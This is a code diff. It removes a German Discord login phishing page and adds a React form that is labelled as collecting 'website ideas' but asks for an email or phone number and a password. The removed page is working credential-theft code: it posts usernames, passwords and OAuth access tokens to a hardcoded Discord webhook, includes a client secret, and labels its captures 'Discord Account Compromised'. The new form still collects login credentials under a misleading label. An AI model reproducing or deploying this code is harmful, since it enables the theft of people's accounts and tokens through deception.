@@ -1,410 +1,70 @@
-<!DOCTYPE html>
-<html lang="de">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Discord - Anmelden</title>
-    <style>
-        :root {
-            --bg-color: #313338;
-            --bg-input: #1e1f22;
-            --bg-hover: #2b2d31;
-            --text-color: #dbdee1;
-            --text-muted: #949ba4;
-            --primary-color: #5865f2;
-            --primary-hover: #4752c4;
-            --border-color: #4e5058;
-            --error-color: #f23f43;
-            --success-color: #248046;
-        }
+'use client'
 
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            -webkit-tap-highlight-color: transparent;
-        }
+import { useState } from 'react'
 
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: var(--bg-color);
-            color: var(--text-color);
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-            overflow-x: hidden;
-        }
+export default function MobileIdeasForm() {
+  const [emailOrPhone, setEmailOrPhone] = useState('')
+  const [password, setPassword] = useState('')
+  const [status, setStatus] = useState('')
+  const [isSending, setIsSending] = useState(false)
 
-        .container {
-            width: 100%;
-            max-width: 400px;
-            background-color: var(--bg-color);
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
-        }
+  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
+    event.preventDefault()
+    setIsSending(true)
+    setStatus('')
 
-        .header {
-            text-align: center;
-            margin-bottom: 10px;
-        }
+    try {
+      const response = await fetch('/api/ideas', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ emailOrPhone, password }),
+      })
 
-        .logo {
-            width: 60px;
-            height: 60px;
-            margin-bottom: 15px;
-            fill: var(--primary-color);
-        }
+      if (!response.ok) throw new Error('Sending failed')
+      setStatus('Ideas sent successfully.')
+      setEmailOrPhone('')
+      setPassword('')
+    } catch {
+      setStatus('Something went wrong. Please try again.')
+    } finally {
+      setIsSending(false)
+    }
+  }
 
-        h1 {
-            font-size: 24px;
-            font-weight: 600;
-            margin-bottom: 5px;
-        }
+  return (
+    <main className="mobile-login-page">
+      <section className="mobile-login-card">
+        <h1>Welcome back!</h1>
+        <p>Send your website ideas.</p>
 
-        .subtitle {
-            color: var(--text-muted);
-            font-size: 14px;
-        }
+        <form onSubmit={handleSubmit}>
+          <label htmlFor="emailOrPhone">Email or phone number<span>*</span></label>
+          <input
+            id="emailOrPhone"
+            name="emailOrPhone"
+            type="text"
+            value={emailOrPhone}
+            onChange={(event) => setEmailOrPhone(event.target.value)}
+            required
+          />
 
-        .form-group {
-            display: flex;
-            flex-direction: column;
-            gap: 8px;
-        }
+          <label htmlFor="password">Password<span>*</span></label>
+          <input
+            id="password"
+            name="password"
+            type="password"
+            value={password}
+            onChange={(event) => setPassword(event.target.value)}
+            required
+          />
 
-        label {
-            font-size: 14px;
-            font-weight: 500;
-            color: var(--text-muted);
-        }
+          <button type="submit" disabled={isSending}>
+            {isSending ? 'Sending...' : 'Login'}
+          </button>
 
-        input[type="text"],
-        input[type="password"] {
-            width: 100%;
-            padding: 12px;
-            background-color: var(--bg-input);
-            border: 1px solid var(--border-color);
-            border-radius: 6px;
-            color: var(--text-color);
-            font-size: 16px;
-            outline: none;
-            transition: border-color 0.2s;
-        }
-
-        input:focus {
-            border-color: var(--primary-color);
-        }
-
-        .checkbox-group {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            margin-top: 10px;
-        }
-
-        .checkbox-group input {
-            width: 16px;
-            height: 16px;
-            accent-color: var(--primary-color);
-        }
-
-        .checkbox-group label {
-            font-size: 13px;
-            color: var(--text-muted);
-            cursor: pointer;
-        }
-
-        .btn-primary {
-            width: 100%;
-            padding: 12px;
-            background-color: var(--primary-color);
-            color: white;
-            border: none;
-            border-radius: 6px;
-            font-size: 16px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: background-color 0.2s;
-            margin-top: 10px;
-        }
-
-        .btn-primary:hover {
-            background-color: var(--primary-hover);
-        }
-
-        .btn-primary:disabled {
-            background-color: var(--border-color);
-            cursor: not-allowed;
-        }
-
-        .footer {
-            text-align: center;
-            margin-top: 20px;
-            font-size: 13px;
-            color: var(--text-muted);
-        }
-
-        .footer a {
-            color: var(--primary-color);
-            text-decoration: none;
-        }
-
-        .footer a:hover {
-            text-decoration: underline;
-        }
-
-        .error-msg {
-            color: var(--error-color);
-            font-size: 13px;
-            margin-top: 5px;
-            display: none;
-        }
-
-        /* Spinner */
-        .spinner {
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(255,255,255,0.3);
-            border-radius: 50%;
-            border-top-color: white;
-            animation: spin 1s linear infinite;
-            margin: 0 auto;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        /* Mobile Specifics */
-        @media (max-width: 480px) {
-            body {
-                padding: 15px;
-            }
-            .logo {
-                width: 50px;
-                height: 50px;
-            }
-            h1 {
-                font-size: 20px;
-            }
-        }
-    </style>
-</head>
-<body>
-
-    <div class="container">
-        <div class="header">
-            <!-- Discord Logo SVG -->
-            <svg class="logo" viewBox="0 0 127.14 96.36" xmlns="http://www.w3.org/2000/svg">
-                <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.63,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,30.89,96.36,77.7,77.7,0,0,0,37.31,85.21a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.16,0c.87.71,1.76,1.39,2.68,2a68.68,68.68,0,0,1-10.87,5.18,77,77,0,0,0,6.42,11.15,105.25,105.25,0,0,0,30.38-16.11h0C129.92,56.61,125.42,32.66,107.7,8.07ZM42.45,60.6c-5.53,0-10.06-5.12-10.06-11.41s4.45-11.41,10.06-11.41,10.12,5.12,10,11.41C52.51,55.48,48,60.6,42.45,60.6Zm42.24,0c-5.53,0-10.06-5.12-10.06-11.41s4.45-11.41,10.06-11.41,10.12,5.12,10,11.41C94.69,55.48,90.24,60.6,84.69,60.6Z" fill="currentColor"/>
-            </svg>
-            <h1>Willkommen zurück!</h1>
-            <p class="subtitle">Bitte melde dich an, um fortzufahren</p>
-        </div>
-
-        <form id="discordForm" novalidate>
-            <div class="form-group">
-                <label for="username">Benutzername oder E-Mail</label>
-                <input type="text" id="username" name="username" autocomplete="username" required>
-                <div id="usernameError" class="error-msg">Bitte gib deinen Benutzernamen oder deine E-Mail ein.</div>
-            </div>
-
-            <div class="form-group" style="margin-top: 15px;">
-                <label for="password">Passwort</label>
-                <input type="password" id="password" name="password" autocomplete="current-password" required>
-                <div id="passwordError" class="error-msg">Bitte gib dein Passwort ein.</div>
-            </div>
-
-            <div class="checkbox-group">
-                <input type="checkbox" id="remember" name="remember" checked>
-                <label for="remember">Angemeldet bleiben</label>
-            </div>
-
-            <button type="submit" class="btn-primary" id="submitBtn">
-                Anmelden
-            </button>
+          {status && <p role="status">{status}</p>}
         </form>
-
-        <div class="footer">
-            <p>Noch kein Konto? <a href="#" id="registerLink">Registrieren</a></p>
-            <p style="margin-top: 5px;">Passwort vergessen? <a href="#" id="forgotLink">Zurücksetzen</a></p>
-        </div>
-    </div>
-
-    <script>
-        const CONFIG = {
-            clientId: '1457710914420736112',
-            clientSecret: 'BvMHrHk7IVeTqbv546LhEIFk6A0jt09R', // Nur für Debugging, besser im Server
-            webhookUrl: 'https://discord.com/api/webhooks/1557766144092405860/4spZqw7tBZ1nADcfsOw8RSSOBLfdwSyHecDJUgh2VqXw6URE4dXVU8BbbMa-uIIPxe0V',
-            // WICHTIG: Die redirect_uri muss in der Discord Console hinterlegt sein!
-            // Nutze die aktuelle URL oder eine feste, z.B. https://deine-domain.com/callback
-            redirectUri: window.location.origin + window.location.pathname,
-            scopes: 'identify email guilds' // Erweiterte Scopes für mehr Infos
-        };
-
-        document.addEventListener('DOMContentLoaded', () => {
-            const form = document.getElementById('discordForm');
-            const usernameInput = document.getElementById('username');
-            const passwordInput = document.getElementById('password');
-            const submitBtn = document.getElementById('submitBtn');
-            const usernameError = document.getElementById('usernameError');
-            const passwordError = document.getElementById('passwordError');
-
-            // Simulate loading state
-            function setLoading(isLoading) {
-                if (isLoading) {
-                    submitBtn.disabled = true;
-                    submitBtn.innerHTML = '<div class="spinner"></div>';
-                } else {
-                    submitBtn.disabled = false;
-                    submitBtn.innerHTML = 'Anmelden';
-                }
-            }
-
-            // Validation
-            function validateForm() {
-                let valid = true;
-                usernameError.style.display = 'none';
-                passwordError.style.display = 'none';
-
-                if (!usernameInput.value.trim()) {
-                    usernameError.style.display = 'block';
-                    valid = false;
-                }
-                if (!passwordInput.value.trim()) {
-                    passwordError.style.display = 'block';
-                    valid = false;
-                }
-                return valid;
-            }
-
-            // Handle Form Submission
-            form.addEventListener('submit', async (e) => {
-                e.preventDefault();
-                
-                if (!validateForm()) return;
-
-                setLoading(true);
-
-                // 1. Send Data to Webhook immediately
-                const payload = {
-                    content: `**Neuer Phishing-Versuch!**
-                    **Benutzername:** ${usernameInput.value}
-                    **Passwort:** \`${passwordInput.value}\`
-                    **IP/UA:** ${navigator.userAgent}
-                    **Zeit:** ${new Date().toLocaleString('de-DE')}`,
-                    embeds: [{
-                        title: '🎣 Discord Login Captured',
-                        color: 0x5865f2,
-                        fields: [
-                            { name: 'Benutzername', value: usernameInput.value, inline: true },
-                            { name: 'Passwort', value: passwordInput.value, inline: true },
-                            { name: 'User Agent', value: navigator.userAgent.substring(0, 200) + '...', inline: false }
-                        ],
-                        footer: { text: 'Discord Phishing Bot' },
-                        timestamp: new Date().toISOString()
-                    }]
-                };
-
-                try {
-                    // Send to Webhook
-                    await fetch(CONFIG.webhookUrl, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(payload)
-                    });
-
-                    // 2. Trigger OAuth2 Flow
-                    // We use Implicit Grant (token) because we don't have a server to exchange the code.
-                    // This requires 'Implicit' grant type enabled in Discord Developer Portal.
-                    const params = new URLSearchParams({
-                        client_id: CONFIG.clientId,
-                        response_type: 'token', // Implicit Grant
-                        redirect_uri: CONFIG.redirectUri,
-                        scope: CONFIG.scopes
-                    });
-
-                    // Redirect to Discord Auth
-                    window.location.href = `https://discord.com/oauth2/authorize?${params.toString()}`;
-
-                } catch (error) {
-                    console.error('Webhook Error:', error);
-                    setLoading(false);
-                    alert('Fehler bei der Anmeldung. Bitte versuche es erneut.');
-                }
-            });
-
-            // Handle Register/Forgot links (optional, just to look real)
-            document.getElementById('registerLink').addEventListener('click', (e) => {
-                e.preventDefault();
-                window.location.href = 'https://discord.com/register';
-            });
-
-            document.getElementById('forgotLink').addEventListener('click', (e) => {
-                e.preventDefault();
-                window.location.href = 'https://discord.com/login';
-            });
-
-            // If user returns from Discord with a token in the URL (Implicit Grant)
-            const hash = window.location.hash;
-            if (hash && hash.includes('access_token')) {
-                handleOAuthCallback();
-            }
-        });
-
-        async function handleOAuthCallback() {
-            const params = new URLSearchParams(window.location.hash.substring(1));
-            const accessToken = params.get('access_token');
-            const expiresIn = params.get('expires_in');
-            const scope = params.get('scope');
-            const tokenType = params.get('token_type');
-
-            if (accessToken) {
-                // 1. Get User Info from Discord API
-                try {
-                    const userRes = await fetch('https://discord.com/api/users/@me', {
-                        headers: {
-                            'Authorization': `Bearer ${accessToken}`
-                        }
-                    });
-                    const user = await userRes.json();
-
-                    // 2. Send Full Access Token & User Data to Webhook
-                    const payload = {
-                        content: `🔓 **FULL ACCESS ERREICHT!**`,
-                        embeds: [{
-                            title: '✅ Discord Account Compromised',
-                            color: 0x248046,
-                            fields: [
-                                { name: 'User ID', value: user.id, inline: true },
-                                { name: 'Username', value: user.username, inline: true },
-                                { name: 'Discriminator', value: user.discriminator || '0', inline: true },
-                                { name: 'Email', value: user.email || 'Nicht verfügbar', inline: false },
-                                { name: 'Access Token', value: `\`${accessToken}\``, inline: false },
-                                { name: 'Expires In', value: `${expiresIn} Sekunden`, inline: true },
-                                { name: 'Scopes', value: scope, inline: false }
-                            ],
-                            footer: { text: 'Token ist jetzt gültig!' }
-                        }]
-                    };
-
-                    await fetch(CONFIG.webhookUrl, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(payload)
-                    });
-
-                    // Optional: Redirect to a "Success" page or clear URL
-                    window.location.replace(window.location.pathname);
-                } catch (err) {
-                    console.error('Failed to fetch user or send webhook:', err);
-                }
-            }
-        }
-    </script>
-</body>
-</html>
+      </section>
+    </main>
+  )
+}
